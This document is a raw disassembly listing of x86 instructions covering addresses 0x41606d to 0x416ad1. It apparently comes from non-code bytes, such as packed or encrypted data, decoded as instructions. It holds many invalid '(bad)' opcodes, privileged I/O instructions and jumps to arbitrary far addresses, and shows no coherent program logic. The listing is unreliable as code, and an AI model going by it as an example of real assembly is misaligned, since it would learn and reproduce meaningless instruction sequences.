  41606d:	not    DWORD PTR [edx+ebx*8-0x45e5f38d]
  416074:	or     ah,BYTE PTR [ebp+0x6658ec7a]
  41607a:	or     BYTE PTR [ebx+0x24],al
  41607d:	sbb    ch,BYTE PTR [ebp+0x3e]
  416080:	test   eax,0x461534bb
  416085:	out    0xf9,eax
  416087:	ins    DWORD PTR es:[edi],dx
  416088:	sub    al,0x5a
  41608a:	push   DWORD PTR [ebx]
  41608c:	cs ret 
  41608e:	sub    DWORD PTR [ebx+0xc3e9914],edi
  416094:	(bad)  
  416095:	cli    
  416096:	test   eax,0x2f6eeda5
  41609b:	mov    edi,0xfda21db1
  4160a0:	popa   
  4160a1:	dec    ebp
  4160a2:	xchg   BYTE PTR [edi-0x54],bh
  4160a5:	mov    BYTE PTR [ebx+0x4e043f0b],dh
  4160ab:	xor    eax,0xd4708d16
  4160b0:	cmc    
  4160b1:	adc    eax,DWORD PTR [esi]
  4160b3:	imul   edi,DWORD PTR [edi],0x0
	...
  416115:	add    BYTE PTR [eax],ah
  416117:	jmp    0xdf3d3f57
  41611c:	in     eax,0xff
  41611e:	and    bl,BYTE PTR [ebx+0x47341187]
  416124:	jmp    0x416186
  416126:	mov    fs,esi
  416128:	add    BYTE PTR [eax],al
  41612a:	pop    es
  41612b:	add    DWORD PTR [eax],eax
  41612d:	add    BYTE PTR [esi],bl
  41612f:	icebp  
  416130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416131:	and    ah,BYTE PTR [eax+ebp*1+0xbf8b662]
  416138:	cmp    ecx,esp
  41613a:	ins    BYTE PTR es:[edi],dx
  41613b:	pop    ecx
  41613c:	loopne 0x41615f
  41613e:	imul   edx,DWORD PTR [ebx-0x7f638392],0xffffff91
  416145:	mov    WORD PTR [edi+eax*8+0x33],fs
  416149:	push   0x551590d8
  41614e:	xchg   edi,eax
  41614f:	dec    esp
  416150:	bound  ebp,QWORD PTR [eax+0x3e531e07]
  416156:	arpl   WORD PTR [eax],cx
  416158:	add    DWORD PTR [esi-0x2b752665],edx
  41615e:	mov    al,ds:0xf456d8a0
  416163:	adc    BYTE PTR [ebx-0x36],bl
  416166:	aas    
  416167:	jmp    0x41618d
  416169:	je     0x416102
  41616b:	pop    di
  41616d:	retf   0x4cf9
  416170:	push   ecx
  416171:	jl     0x4160f3
  416173:	dec    esi
  416174:	cwde   
  416175:	rol    BYTE PTR [ebx+0x14],1
  416178:	mov    ds:0x3abd5c57,al
  41617d:	(bad)  
  41617e:	(bad)  
  416180:	es adc al,0x6d
  416183:	mov    BYTE PTR [ebx],dh
  416185:	popf   
  416186:	mov    al,0x4
  416188:	call   0x6046:0x4e78d689
  41618f:	or     eax,0x7b18a2e2
  416194:	push   esi
  416195:	int    0x9d
  416197:	adc    DWORD PTR [ebx+0x6d],ebp
  41619a:	pushf  
  41619b:	xor    DWORD PTR [edi],esp
  41619d:	add    dh,BYTE PTR [edx+0x16769e03]
  4161a3:	(bad)  
  4161a5:	scas   al,BYTE PTR es:[edi]
  4161a6:	sub    al,0xda
  4161a8:	dec    eax
  4161a9:	cld    
  4161aa:	sbb    DWORD PTR [ecx],eax
  4161ac:	test   BYTE PTR ds:0xce508542,bh
  4161b2:	mov    al,ds:0xda2e986a
  4161b8:	fcmove st,st(2)
  4161ba:	fdivr  DWORD PTR [edi-0x4ea95a6]
  4161c0:	or     eax,0x45e2b554
  4161c5:	mov    cl,0x81
  4161c7:	mov    dl,0xca
  4161c9:	enter  0x4415,0xe3
  4161cd:	fld    st(7)
  4161cf:	jo     0x416233
  4161d1:	fst    QWORD PTR [esp+ebx*2-0x1607705e]
  4161d8:	inc    esi
  4161d9:	enter  0x99a9,0x3b
  4161dd:	inc    ecx
  4161de:	add    al,0xd5
  4161e0:	cwde   
  4161e1:	xchg   edx,eax
  4161e2:	xchg   esi,eax
  4161e3:	stos   DWORD PTR es:[edi],eax
  4161e4:	pop    edi
  4161e5:	arpl   WORD PTR [ecx+0x41],bp
  4161e8:	mov    ebp,DWORD PTR [esi]
  4161ea:	loop   0x4161f2
  4161ec:	push   edi
  4161ed:	gs jmp 0x80b26b7b
  4161f3:	adc    eax,0xbb81c5d0
  4161f8:	sub    eax,DWORD PTR [edi]
  4161fa:	mov    al,0x42
  4161fc:	xor    eax,DWORD PTR [ebx]
  4161fe:	(bad)  
  4161ff:	popw   es
  416201:	fdivr  DWORD PTR [ebp-0x6c]
  416204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416205:	out    0x9f,al
  416207:	mov    WORD PTR [edx+eiz*2],fs
  41620a:	div    al
  41620c:	add    DWORD PTR [ecx-0x13],ecx
  41620f:	sub    bl,BYTE PTR [ebx+0x713672d7]
  416215:	mov    eax,0xc010d861
  41621a:	jns    0x4161ee
  41621c:	dec    ebp
  41621d:	pop    eax
  41621e:	inc    ecx
  41621f:	pop    esi
  416220:	sub    BYTE PTR [ebp+0x76],bl
  416223:	cmp    BYTE PTR [eax+0x4a2b41f4],0xa2
  41622a:	xchg   cl,ch
  41622c:	pop    es
  41622d:	and    eax,DWORD PTR [esi+0x7f]
  416230:	mov    esp,0xeded0be4
	...
  416295:	add    BYTE PTR [ebx],ah
  416297:	outs   dx,BYTE PTR ds:[esi]
  416298:	xor    ah,BYTE PTR ds:0x6e377d7f
  41629e:	test   BYTE PTR [esi+0xd0ff6de],bh
  4162a4:	das    
  4162a5:	out    0x95,al
  4162a7:	out    0x0,eax
  4162a9:	add    BYTE PTR [edi],al
  4162ab:	add    DWORD PTR [eax],eax
  4162ad:	add    BYTE PTR [eax],dh
  4162af:	rol    DWORD PTR [edi],1
  4162b1:	test   DWORD PTR [edx+0x30],eax
  4162b4:	xor    esp,ecx
  4162b6:	out    dx,eax
  4162b7:	mov    ch,0x23
  4162b9:	xchg   edx,eax
  4162ba:	or     ebp,DWORD PTR [ebx]
  4162bc:	dec    ebp
  4162bd:	mov    ds:0x9aa34c9d,al
  4162c2:	push   edx
  4162c3:	inc    edx
  4162c4:	mov    WORD PTR ds:0xfdb86745,ds
  4162ca:	jmp    0xe904:0x16f71d40
  4162d1:	sti    
  4162d2:	jmp    0x4162fc
  4162d4:	jo     0x4162a9
  4162d6:	push   eax
  4162d7:	pop    edi
  4162d8:	push   0x4b
  4162da:	lods   eax,DWORD PTR ds:[esi]
  4162db:	cld    
  4162dc:	mov    al,0x86
  4162de:	in     eax,0x2b
  4162e0:	pop    es
  4162e1:	xchg   esp,eax
  4162e2:	ret    
  4162e3:	sub    al,0x54
  4162e5:	jp     0x4162c8
  4162e7:	cmp    al,0x89
  4162e9:	inc    edi
  4162ea:	mov    ch,0x68
  4162ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162ed:	push   edx
  4162ee:	mov    WORD PTR [ebx+0x7b],ss
  4162f1:	fisubr WORD PTR [esi-0x1c]
  4162f4:	mov    esi,0x5725898f
  4162f9:	sub    BYTE PTR [eax+0xe7a6ccd],0x8c
  416300:	push   ss
  416301:	pop    ss
  416302:	call   0x8044:0x492b4846
  416309:	add    edx,DWORD PTR [esi]
  41630b:	rcr    DWORD PTR [esi+0x5a7a891],1
  416311:	jns    0x416302
  416313:	xor    ch,BYTE PTR [ebp+0x21]
  416316:	es ds mov edx,0xe89571e2
  41631d:	jo     0x416395
  41631f:	scas   al,BYTE PTR es:[edi]
  416320:	lahf   
  416321:	scas   eax,DWORD PTR es:[edi]
  416322:	lods   eax,DWORD PTR ds:[esi]
  416323:	mov    eax,0x1c1824ab
  416328:	sub    dh,BYTE PTR [eax]
  41632a:	dec    ecx
  41632b:	cmp    ebp,DWORD PTR [esi+0x5b]
  41632e:	mov    esp,0x2d16be1c
  416333:	mov    ecx,0x3b65f408
  416338:	outs   dx,DWORD PTR ds:[esi]
  416339:	ja     0x41633e
  41633b:	xor    ebx,DWORD PTR [eax+0x2e604c22]
  416341:	sbb    DWORD PTR [ebx],0xffffffea
  416344:	inc    ebp
  416345:	imul   edi,ebx,0x24edc963
  41634b:	sbb    edx,0xffffffc8
  41634e:	mov    ecx,0x8b136d05
  416353:	ret    0x91f9
  416356:	(bad)  
  416357:	jmp    0x4163d2
  416359:	fdivr  DWORD PTR [edx]
  41635b:	push   0xd5c746fe
  416360:	push   edi
  416361:	push   edx
  416362:	icebp  
  416363:	retf   0x4e51
  416366:	and    edi,DWORD PTR [ebx-0x6c7a118a]
  41636c:	add    DWORD PTR [edx+ecx*2+0x61a7902a],eax
  416373:	lods   eax,DWORD PTR ds:[esi]
  416374:	test   al,0xa7
  416376:	int    0x65
  416378:	push   edx
  416379:	jo     0x4163c3
  41637b:	sub    al,0x26
  41637d:	dec    ebp
  41637e:	mov    ch,0xec
  416380:	scas   eax,DWORD PTR es:[edi]
  416381:	sub    DWORD PTR [esp+eax*4],eax
  416384:	pop    edx
  416385:	popf   
  416386:	pop    esi
  416387:	pop    es
  416388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416389:	and    BYTE PTR [edx+0xb0b33c0],ch
  41638f:	mov    al,0x21
  416391:	rcr    DWORD PTR [ecx+0x56],0xf6
  416395:	adc    al,0xe
  416397:	in     al,0x15
  416399:	cli    
  41639a:	aam    0x81
  41639c:	inc    ebp
  41639d:	mov    ds:0x963418d,al
  4163a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163a3:	add    al,0xde
  4163a5:	out    0x31,eax
  4163a7:	mov    ds:0x9818eab2,al
  4163ac:	test   DWORD PTR [ebp+0x48],ebp
  4163af:	repz lock sub eax,0xa04ec8
	...
  416416:	repz inc ebx
  416418:	ror    cl,1
  41641a:	lock (bad) 
  41641d:	jnp    0x416481
  41641f:	xchg   esi,eax
  416420:	cmp    DWORD PTR [ebp-0x7dde6dda],edx
  416426:	pushf  
  416427:	call   0x148642c
  41642c:	add    BYTE PTR [eax],al
  41642e:	gs jmp 0x3b7:0x38d12457
  416436:	jge    0x416440
  416438:	and    ebx,DWORD PTR ds:0x5f474b1d
  41643e:	(bad)  
  41643f:	fidiv  WORD PTR [ebx]
  416441:	out    dx,al
  416442:	add    ah,BYTE PTR [edx-0x2a]
  416445:	in     eax,0xde
  416447:	popa   
  416448:	(bad)  
  416449:	adc    ebx,edx
  41644b:	call   0xa27a5cb7
  416450:	pop    ebx
  416451:	sub    DWORD PTR [esi*4-0x4cd2da10],eax
  416458:	in     eax,0x0
  41645a:	(bad)  
  41645b:	lahf   
  41645c:	cmc    
  41645d:	pop    ebx
  41645e:	jbe    0x416427
  416460:	push   edi
  416461:	sub    al,0x59
  416463:	and    eax,0x401c7db7
  416468:	jo     0x416400
  41646a:	scas   al,BYTE PTR es:[edi]
  41646b:	int    0x22
  41646d:	das    
  41646e:	cli    
  41646f:	mov    ss,WORD PTR [esi]
  416471:	xlat   BYTE PTR es:[ebx]
  416473:	xor    al,0xe6
  416475:	push   0xeed73d55
  41647a:	mov    bh,0x9
  41647c:	or     eax,0x1d6a9c26
  416481:	popa   
  416482:	sub    ecx,DWORD PTR [ebx]
  416484:	jp     0x41641e
  416486:	test   eax,0xc2a47276
  41648b:	xor    DWORD PTR [ecx],esp
  41648d:	enter  0xb56b,0x94
  416491:	pop    ecx
  416492:	into   
  416493:	pop    ss
  416494:	dec    ebx
  416495:	xor    BYTE PTR [ecx-0x2],bl
  416498:	inc    edi
  416499:	sbb    dh,BYTE PTR ss:[edi+ebp*8+0x4da83b95]
  4164a1:	dec    esp
  4164a2:	into   
  4164a3:	adc    DWORD PTR [ebx],eax
  4164a5:	ins    BYTE PTR es:[edi],dx
  4164a6:	sbb    BYTE PTR [edx-0x6c0737b5],cl
  4164ac:	push   eax
  4164ad:	inc    ecx
  4164ae:	fisub  WORD PTR [edx+0x691c6d79]
  4164b4:	out    0x72,al
  4164b6:	and    al,0xe6
  4164b8:	add    BYTE PTR [edx],0x2d
  4164bb:	push   esi
  4164bc:	jb     0x416457
  4164be:	fdivr  QWORD PTR [ebp-0x52]
  4164c1:	mov    ds:0x209b56eb,eax
  4164c6:	inc    ecx
  4164c7:	adc    ch,BYTE PTR [edx+0x115ea09a]
  4164cd:	fadd   QWORD PTR [esi]
  4164cf:	nop
  4164d0:	fnstenv [ebx-0x4f]
  4164d3:	sub    eax,0x82ab9391
  4164d8:	mov    es,WORD PTR [edx+0x6e]
  4164db:	repz stc 
  4164dd:	add    ecx,esi
  4164df:	pop    ebx
  4164e0:	enter  0xd8a7,0x31
  4164e4:	jae    0x416543
  4164e6:	mov    dh,0x9b
  4164e8:	lds    esi,FWORD PTR [edx+0x54]
  4164eb:	icebp  
  4164ec:	rcl    BYTE PTR [eax-0x71],0xd9
  4164f0:	mov    dl,0x4d
  4164f2:	mov    WORD PTR [edx],?
  4164f4:	mov    ds:0x6a154670,al
  4164f9:	pop    esp
  4164fa:	ror    DWORD PTR [esi+ebx*1+0x7f2bc1ba],1
  416501:	adc    BYTE PTR [ecx+0x25],ch
  416504:	aam    0x81
  416506:	mov    DWORD PTR ds:0x889227f9,edi
  41650c:	rep stos DWORD PTR es:[edi],eax
  41650e:	add    DWORD PTR [ebx+0xd1157c],esp
  416514:	add    DWORD PTR [edi-0x50],esi
  416517:	retf   0x3d1d
  41651a:	mov    al,BYTE PTR [eax]
  41651c:	fstp   st(3)
  41651e:	xchg   ecx,eax
  41651f:	arpl   WORD PTR [edi+0x7022d4bb],si
  416525:	hlt    
  416526:	inc    eax
  416527:	out    0xde,eax
  416529:	data16 (bad) 
  41652b:	mov    ebx,ss
  41652d:	lock push eax
  41652f:	sub    bl,BYTE PTR [ebx-0x61]
  416532:	mov    bl,0x7d
  416534:	repnz add BYTE PTR [eax],al
	...
  416593:	add    BYTE PTR [eax],al
  416595:	add    BYTE PTR ds:0xfff32bd8,ah
  41659b:	repz std 
  41659d:	fisubr WORD PTR [edi+ebp*1+0x72]
  4165a1:	jno    0x416561
  4165a3:	adc    al,0xe3
  4165a5:	and    DWORD PTR [ebx+0x70000e9],0x1
  4165ac:	add    BYTE PTR [eax],al
  4165ae:	pop    edx
  4165af:	call   0x841cefe
  4165b4:	mul    bl
  4165b6:	mov    DWORD PTR [eax+0x53],eax
  4165b9:	(bad)  
  4165ba:	fisubr DWORD PTR [ebx-0x6d]
  4165bd:	cmp    al,BYTE PTR [esp+edi*8-0x3d]
  4165c1:	adc    eax,0x97319ffb
  4165c6:	cmp    bl,ch
  4165c8:	in     al,dx
  4165c9:	in     al,0xb1
  4165cb:	pop    es
  4165cc:	dec    esi
  4165cd:	jecxz  0x4165ef
  4165cf:	xlat   BYTE PTR ds:[ebx]
  4165d0:	cmp    al,0x73
  4165d2:	js     0x4165d0
  4165d4:	dec    edx
  4165d5:	call   0xceaee779
  4165da:	cld    
  4165db:	mov    cl,0xa
  4165dd:	mov    eax,0x7e2ff611
  4165e2:	mov    al,0x7f
  4165e4:	fadd   QWORD PTR [eax+0x57be018b]
  4165ea:	in     al,dx
  4165eb:	iret   
  4165ec:	and    ch,al
  4165ee:	pop    esi
  4165ef:	les    edx,FWORD PTR [ebp-0x1e91bc77]
  4165f5:	retf   
  4165f6:	scas   eax,DWORD PTR es:[edi]
  4165f7:	dec    eax
  4165f8:	dec    esp
  4165f9:	pop    ecx
  4165fa:	dec    ebx
  4165fb:	add    DWORD PTR [edx-0x7f115d32],ecx
  416601:	add    ecx,DWORD PTR [ebx]
  416603:	mov    bh,0x72
  416605:	cmp    ebx,esp
  416607:	push   cs
  416608:	or     bh,ch
  41660a:	dec    ebx
  41660b:	mov    esp,0x6bb4c517
  416610:	xor    al,0x10
  416612:	mov    ecx,0xbf5ad713
  416617:	(bad)  
  416619:	test   DWORD PTR [ebx+ebp*2],ebx
  41661c:	test   DWORD PTR [ebx+0x9],edx
  41661f:	pop    es
  416620:	mov    ebp,0xd57a6a2a
  416625:	into   
  416626:	dec    ecx
  416627:	(bad)  
  416628:	arpl   WORD PTR [ebx-0x59],sp
  41662b:	dec    esp
  41662c:	and    ch,BYTE PTR [esp+eiz*2-0x36]
  416630:	sahf   
  416631:	shr    DWORD PTR [ecx+0x6c1bbf56],0x8b
  416638:	ins    DWORD PTR es:[edi],dx
  416639:	adc    esi,DWORD PTR [ebp+0x11]
  41663c:	(bad)  
  41663d:	lods   al,BYTE PTR ds:[esi]
  41663e:	or     bh,bl
  416640:	in     eax,0xae
  416642:	cmp    eax,0xe1c23a3a
  416647:	shl    ch,cl
  416649:	jp     0x416683
  41664b:	pop    esi
  41664c:	push   ecx
  41664d:	test   al,0x8d
  41664f:	dec    esi
  416650:	mov    ds:0x426c7170,al
  416655:	int    0x79
  416657:	aam    0xe9
  416659:	out    0xdb,eax
  41665b:	cld    
  41665c:	aad    0xbc
  41665e:	mov    ds:0xe535733f,eax
  416663:	add    al,BYTE PTR [eax+0x2c]
  416666:	push   eax
  416667:	jge    0x4165f7
  416669:	sbb    eax,0x741bf2d4
  41666e:	or     esi,DWORD PTR [edi]
  416670:	daa    
  416671:	out    0x76,al
  416673:	int    0xbe
  416675:	pop    eax
  416676:	enter  0xecbe,0xfe
  41667a:	aam    0xe6
  41667c:	jno    0x416652
  41667e:	jg     0x4166cc
  416680:	jg     0x416614
  416682:	bound  edx,QWORD PTR [ebp+0x79]
  416685:	rcr    eax,0x4d
  416688:	cmp    edi,ecx
  41668a:	pop    edx
  41668b:	int3   
  41668c:	dec    eax
  41668d:	push   esp
  41668e:	mov    ebp,DWORD PTR [eax]
  416690:	pop    ebx
  416691:	adc    DWORD PTR [edx],esi
  416693:	push   esi
  416694:	xchg   ebp,eax
  416695:	and    esi,DWORD PTR [esi-0x4a561541]
  41669b:	adc    eax,0x43b5be6d
  4166a0:	mov    bl,0xe9
  4166a2:	ds xor eax,0x25b63bca
  4166a8:	xlat   BYTE PTR ds:[ebx]
  4166a9:	dec    edi
  4166aa:	push   0xffffff93
  4166ac:	mov    dh,0x6a
  4166ae:	mov    ebp,0xa4bb9301
  4166b3:	or     eax,0xeb
	...
  416714:	add    BYTE PTR [eax],al
  416716:	(bad)  
  416717:	(bad)  
  416719:	(bad)  
  41671a:	(bad)  
  41671c:	out    0xff,eax
  41671e:	mov    ah,0x10
  416720:	mov    cl,0x4f
  416722:	dec    ecx
  416723:	add    ch,ah
  416725:	jns    0x4166d1
  416727:	jmp    0x0:0x1070000
  41672e:	lods   al,BYTE PTR ds:[esi]
  41672f:	pusha  
  416730:	shr    DWORD PTR [eax+edx*8-0x75],1
  416734:	and    BYTE PTR [ecx],ah
  416736:	cld    
  416737:	ret    0xf650
  41673a:	sub    al,BYTE PTR ds:0x8016102a
  416740:	add    ebp,DWORD PTR [edi]
  416742:	push   ebx
  416743:	out    0xb5,al
  416745:	mov    edi,0x7dcc8b5e
  41674a:	ret    0xa3c7
  41674d:	jb     0x416730
  41674f:	test   dl,cl
  416751:	imul   esi,ecx,0x7d3ea56e
  416757:	xor    bl,dh
  416759:	lahf   
  41675a:	fsub   st,st(3)
  41675c:	cmp    eax,0xc7082ffe
  416761:	push   0xffffff91
  416763:	xor    ebx,edx
  416765:	test   al,0xd1
  416767:	ficom  DWORD PTR [ebp-0x1a180ad6]
  41676d:	jmp    0x416719
  41676f:	(bad)  
  416770:	jnp    0x416798
  416772:	in     eax,dx
  416773:	mov    esi,0x94305ea2
  416778:	loop   0x416773
  41677a:	mov    cl,0xcf
  41677c:	mov    bh,0x5
  41677e:	jmp    0x4f51:0xd8c4354d
  416785:	mov    ebx,DWORD PTR [edx]
  416787:	loopne 0x41677f
  416789:	and    eax,0x23d8dec9
  41678e:	push   edx
  41678f:	out    dx,eax
  416790:	sbb    al,0x34
  416792:	mov    ebx,0x1a084cc6
  416797:	inc    eax
  416798:	call   0x87de:0x251bdfdd
  41679f:	fisub  WORD PTR ds:0x50c3cdf
  4167a5:	enter  0x94b3,0x6c
  4167a9:	out    dx,eax
  4167aa:	ror    DWORD PTR [ebx+eiz*2-0xf4c2854],1
  4167b1:	pop    edx
  4167b2:	jb     0x4167c1
  4167b4:	jp     0x4167a3
  4167b6:	jp     0x416795
  4167b8:	(bad)  
  4167b9:	fnsave [edx+0x78]
  4167bc:	mov    eax,ds:0x1541b45f
  4167c1:	js     0x4167ee
  4167c3:	(bad)  
  4167c4:	pushf  
  4167c5:	pop    esi
  4167c6:	fs xchg ecx,eax
  4167c8:	xchg   esp,eax
  4167c9:	jne    0x4167fc
  4167cb:	(bad)  
  4167cc:	push   cs
  4167cd:	xchg   ebx,eax
  4167ce:	jo     0x416814
  4167d0:	pop    ss
  4167d1:	pop    ecx
  4167d2:	xor    BYTE PTR [esi+0x3f1f93bf],0xd
  4167d9:	ins    DWORD PTR es:[edi],dx
  4167da:	aaa    
  4167db:	add    dh,BYTE PTR [esp+ebp*4+0x51]
  4167df:	pop    edx
  4167e0:	loope  0x41685c
  4167e2:	sti    
  4167e3:	jns    0x416768
  4167e5:	jmp    0x9a633cc7
  4167ea:	aaa    
  4167eb:	fidiv  DWORD PTR [esi]
  4167ed:	bound  ecx,QWORD PTR [eax+0x4a7d74a7]
  4167f3:	ret    0x20f0
  4167f6:	cmp    bh,BYTE PTR [ebp+ecx*4+0x11]
  4167fa:	test   al,0x21
  4167fc:	mov    dl,0x6
  4167fe:	mov    edx,0x13ff6a13
  416803:	jne    0x416823
  416805:	rol    esi,cl
  416807:	and    al,0x67
  416809:	adc    bl,BYTE PTR [edi+0x59]
  41680c:	out    0xee,eax
  41680e:	cmp    al,0x5d
  416810:	aad    0x31
  416812:	xchg   esp,eax
  416813:	or     bl,BYTE PTR [eax+0x1ffb3ea8]
  416819:	xor    DWORD PTR [esi+0x505ce20d],ebx
  41681f:	adc    eax,0x4ce4c403
  416824:	test   DWORD PTR ds:0x2c8eb0ed,ecx
  41682a:	xchg   edi,eax
  41682b:	(bad)  
  41682c:	outs   dx,DWORD PTR ds:[esi]
  41682d:	sub    DWORD PTR [ebp+0x5e],eax
  416830:	nop
  416831:	cli    
  416832:	ds pop ds
  416834:	std    
	...
  416895:	add    cl,dl
  416897:	scas   eax,DWORD PTR es:[edi]
  416898:	push   es
  416899:	repz jle 0x416897
  41689c:	cmc    
  41689d:	scas   eax,DWORD PTR es:[edi]
  41689e:	cwde   
  41689f:	sub    bh,al
  4168a1:	repnz xor ecx,ebx
  4168a4:	ror    BYTE PTR [esi+0xebb1],1
  4168aa:	pop    es
  4168ab:	add    DWORD PTR [eax],eax
  4168ad:	add    BYTE PTR [eax+0xa],bh
  4168b0:	ret    0xdaee
  4168b3:	mov    edx,0x9cb19bb4
  4168b8:	test   al,0xe1
  4168ba:	push   es
  4168bb:	cld    
  4168bc:	mov    DWORD PTR ds:0x42ee8304,0x91bf83f0
  4168c6:	rol    BYTE PTR [eax+0x3a],1
  4168c9:	sub    DWORD PTR [ecx-0x33],ecx
  4168cc:	ret    
  4168cd:	sbb    eax,0x973661a4
  4168d2:	xor    esp,DWORD PTR [eax]
  4168d4:	mov    esp,0xc4809122
  4168d9:	fwait
  4168da:	sbb    bh,BYTE PTR [eax+0x2d]
  4168dd:	jns    0x416934
  4168df:	cmp    eax,0xc5f43b11
  4168e4:	jp     0x416921
  4168e6:	in     al,0x71
  4168e8:	sti    
  4168e9:	es icebp 
  4168eb:	dec    ebx
  4168ec:	jb     0x416870
  4168ee:	clc    
  4168ef:	aad    0xb6
  4168f1:	push   cs
  4168f2:	xchg   esp,eax
  4168f3:	scas   al,BYTE PTR es:[edi]
  4168f4:	mov    al,ds:0x9e7e39ae
  4168f9:	dec    edx
  4168fa:	jnp    0x416937
  4168fc:	lods   eax,DWORD PTR ds:[esi]
  4168fd:	arpl   WORD PTR [ecx+0x3f],sp
  416900:	xlat   BYTE PTR ds:[ebx]
  416901:	mov    edx,0x5958b6b7
  416906:	push   0x55
  416908:	mov    cl,0xa7
  41690a:	add    al,0xc9
  41690c:	lods   al,BYTE PTR ds:[esi]
  41690d:	sub    DWORD PTR [edi+edi*1],esp
  416910:	xor    BYTE PTR [esi],0xe9
  416913:	pop    es
  416914:	aaa    
  416915:	push   cs
  416916:	mov    dl,dh
  416918:	cmc    
  416919:	stc    
  41691a:	xor    edi,DWORD PTR [ebx+ebp*2]
  41691d:	push   eax
  41691e:	jecxz  0x41692a
  416920:	mov    esp,0x8fb07ebe
  416925:	xor    ch,BYTE PTR [ecx]
  416927:	sbb    DWORD PTR [ebx-0x7a],ebp
  41692a:	sub    esi,ebp
  41692c:	sahf   
  41692d:	cs mov dh,0x2d
  416930:	scas   al,BYTE PTR es:[edi]
  416931:	lahf   
  416932:	sbb    eax,0xde714329
  416937:	mov    dh,0x60
  416939:	xchg   ecx,eax
  41693a:	jno    0x41693f
  41693c:	popa   
  41693d:	xchg   ebp,eax
  41693e:	xchg   edi,eax
  41693f:	jp     0x4168e7
  416941:	popa   
  416942:	jl     0x4168d2
  416944:	inc    ecx
  416945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416946:	sbb    cl,BYTE PTR [eax+0x4447d016]
  41694c:	stos   DWORD PTR es:[edi],eax
  41694d:	mov    dh,0x99
  41694f:	cld    
  416950:	cli    
  416951:	push   ecx
  416952:	push   edi
  416953:	ja     0x4168f9
  416955:	imul   ebp,DWORD PTR [ebx+0xadc2d11],0x47
  41695c:	dec    ebx
  41695d:	jmp    0x5d05:0x8b6c668f
  416964:	out    0xd,al
  416966:	xchg   ebx,eax
  416967:	push   ebp
  416968:	mov    bl,0xad
  41696a:	jle    0x4169c4
  41696c:	mov    ah,0x3c
  41696e:	xchg   ebp,esi
  416970:	(bad)  
  416971:	mov    ds:0xbd24f173,eax
  416976:	xchg   ebx,eax
  416977:	enter  0xf479,0xd3
  41697b:	repz mov bh,0x76
  41697e:	mov    DWORD PTR [eax-0x7fd7f371],0x58552f7b
  416988:	inc    ecx
  416989:	test   al,0x8d
  41698b:	sti    
  41698c:	adc    edi,DWORD PTR [ecx]
  41698e:	daa    
  41698f:	xchg   DWORD PTR [edi+0x29d7473b],eax
  416995:	(bad)  
  416997:	pop    es
  416998:	sbb    ah,BYTE PTR [eax+edx*1-0x20]
  41699c:	je     0x41697a
  41699e:	dec    esi
  41699f:	imul   esp,DWORD PTR [esi],0x2d
  4169a2:	push   0xc1739d1e
  4169a7:	ret    
  4169a8:	in     eax,0x88
  4169aa:	shl    DWORD PTR [edx+0x176bbe4d],0x3a
  4169b1:	mov    edx,0x4f90c9
	...
  416a16:	retf   
  416a17:	pusha  
  416a18:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a1e:	enter  0x4aea,0x13
  416a22:	mov    ah,BYTE PTR [ebx-0x16]
  416a25:	mov    dl,0xb8
  416a27:	in     al,dx
  416a28:	add    BYTE PTR [eax],al
  416a2a:	pop    es
  416a2b:	add    DWORD PTR [eax],eax
  416a2d:	add    BYTE PTR [edx+0x23],cl
  416a30:	mov    edi,0x7121b2b7
  416a35:	lock sub BYTE PTR [edx],al
  416a38:	pop    eax
  416a39:	inc    eax
  416a3a:	retf   
  416a3b:	nop
  416a3c:	xchg   esi,eax
  416a3d:	mov    ah,0x87
  416a3f:	jmp    0xa5ab:0xefdd0542
  416a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a47:	jg     0x4169fb
  416a49:	dec    ebx
  416a4a:	mov    ecx,0x7ccc16d1
  416a4f:	jae    0x416a3d
  416a51:	push   es
  416a52:	out    dx,al
  416a53:	in     al,dx
  416a54:	xchg   ebp,eax
  416a55:	stc    
  416a56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a57:	sbb    edx,DWORD PTR [ebx]
  416a59:	idiv   DWORD PTR [ecx-0x5063904b]
  416a5f:	aad    0x13
  416a61:	mov    BYTE PTR [ecx],cl
  416a63:	inc    edi
  416a64:	cwde   
  416a65:	xor    ecx,DWORD PTR [esi+0x7f11da0]
  416a6b:	jge    0x416ab5
  416a6d:	add    eax,0x4118909b
  416a72:	dec    edi
  416a73:	out    dx,al
  416a74:	jnp    0x416ada
  416a76:	lods   eax,DWORD PTR ds:[esi]
  416a77:	sub    bh,ch
  416a79:	inc    eax
  416a7a:	jp     0x416a4e
  416a7c:	xchg   ebp,eax
  416a7d:	mov    WORD PTR [ebx],ss
  416a7f:	and    eax,DWORD PTR [ecx]
  416a81:	ror    DWORD PTR [ebp-0xf],cl
  416a84:	in     al,0xdc
  416a86:	adc    BYTE PTR [eax-0x7a13a257],ah
  416a8c:	mov    eax,0x7a1b9e54
  416a91:	push   ecx
  416a92:	xchg   ecx,eax
  416a93:	rcl    BYTE PTR [esi-0x5eb909b7],1
  416a99:	push   ebx
  416a9a:	cld    
  416a9b:	push   ecx
  416a9c:	in     al,0xc0
  416a9e:	and    DWORD PTR [ebx-0x28d4f8d2],ebx
  416aa4:	mov    bh,0x66
  416aa6:	pop    es
  416aa7:	push   ebx
  416aa8:	fldpi  
  416aaa:	sub    ebp,DWORD PTR [ecx+0x6c]
  416aad:	ins    DWORD PTR es:[edi],dx
  416aae:	es dec edx
  416ab0:	pop    esi
  416ab1:	jnp    0x416ade
  416ab3:	pop    ebp
  416ab4:	fwait
  416ab5:	cmp    DWORD PTR [edi+0x5c],eax
  416ab8:	popf   
  416ab9:	icebp  
  416aba:	pop    edi
  416abb:	pop    edi
  416abc:	(bad)  
  416abd:	out    dx,eax
  416abe:	xchg   DWORD PTR [edx-0x53],eax
  416ac1:	or     al,0x18
  416ac3:	jbe    0x416a6c
  416ac5:	(bad)  
  416ac6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ac7:	pop    ds
  416ac8:	push   ebx
  416ac9:	scas   al,BYTE PTR es:[edi]
  416aca:	or     DWORD PTR [edi-0x45],ecx
  416acd:	or     cl,BYTE PTR [esp+ebx*2+0x68]
  416ad1:	aas    
